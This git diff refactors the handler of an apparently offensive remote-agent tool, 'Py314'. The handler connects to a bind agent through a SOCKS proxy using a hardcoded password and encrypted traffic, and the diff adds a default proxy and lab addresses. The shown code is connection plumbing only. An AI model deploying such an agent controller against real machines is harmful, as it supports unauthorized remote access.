@@ -1,14 +1,14 @@
 import sys
 import glob
 import time
-#import socket
+import socket
 import socks
 import modules
 import logging
 import hashlib
 import threading
 from cmd import Cmd
-from core.channels import bind_tcp
+from core import channels
 from os import system, path
 from netaddr import ip
 from termcolor import colored
@@ -59,8 +59,6 @@ class Agent(Cmd):
             
         elif not arg:
             table = PrettyTable()
-            #table.vertical_char = ' '
-            #table.border = False
 
             headers = ['command', 'description']
             table.field_names = headers
@@ -166,7 +164,7 @@ class Prompt(Cmd):
         'rhost': '10.0.10.110',
         'rport': 1234,
         'password': 'Py314!',
-        'proxy': '', 
+        'proxy': 'socks5://10.0.10.117:1080', 
         'verbose': False
     }
 
@@ -302,7 +300,7 @@ class Prompt(Cmd):
         """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""
 
     def set_proxy(self):
-        """Define a proxy, which be use to bind Py314 agent : <type>://<ip>:<port>"""
+        """Define a proxy (socks4, socks5 and HTTP), which be use to bind Py314 agent : <type>://<ip>:<port>"""
 
     def set_verbose(self):
         """Enable verbosity of bind_agent handler (default : False)"""
@@ -341,20 +339,12 @@ def bindAgent(dictionnary):
     
     try:
     
-        #print(f"[+] Trying to connect to {host}:{port}")
-        logger.info(f"Trying to connect to {host}:{port}")
+        channel = channels.bind_tcp(host, port, proxy)
 
-        #channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        #channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #channel.connect((host, port))
-
-        #channel = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-        #channel.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-        bind_tcp(host, port, proxy)
-
-
-        exit()
+        if type(channel) == bool:
+            logger.debug('Returned channel is false')
+            return
+        
 
         challenge = passwordChallenge(channel, ciperPassword)
 
@@ -388,17 +378,9 @@ def bindAgent(dictionnary):
             else:
                 pass
 
-    except ConnectionError as error:
-        logger.info(f"Can't established connection to {host}")
-        logger.debug(error)
-        return
-
-    except ConnectionRefusedError as e:
-        print(e)
-        return
 
     except OSError as error:
-        logger.warning(f"{error}")
+        #logger.warning(error)
         return
 
 
@@ -422,9 +404,6 @@ def passwordChallenge(channel, password):
 
 
     return answer
-
-
-
 
 def checkAgent(channel, objet):
     
